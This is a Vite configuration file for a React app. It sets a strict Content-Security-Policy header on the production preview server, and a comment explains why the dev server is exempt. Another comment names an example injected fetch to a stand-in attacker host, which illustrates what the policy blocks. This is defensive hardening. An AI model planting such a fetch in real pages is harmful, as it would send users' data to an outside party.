import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

// The same strict CSP the API sends, applied to the HTML page the browser renders.
// connect-src lists the API origin so the app can still call it, and nothing else
// (an injected fetch('https://attacker.example/...') is refused by the browser).
const CSP = [
  "default-src 'self'",
  "script-src 'self'",
  "script-src-attr 'none'",
  "style-src 'self'",
  "img-src 'self' data:",
  "connect-src 'self' http://localhost:4000",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'"
].join('; ')

export default defineConfig({
  plugins: [react()],
  server: {
    port: 5175
  },
  // Production build (`vite build && vite preview`). Not applied to the dev server,
  // because Vite's dev mode injects an inline React-refresh script that a strict CSP blocks.
  preview: {
    port: 5175,
    headers: { 'Content-Security-Policy': CSP }
  }
})
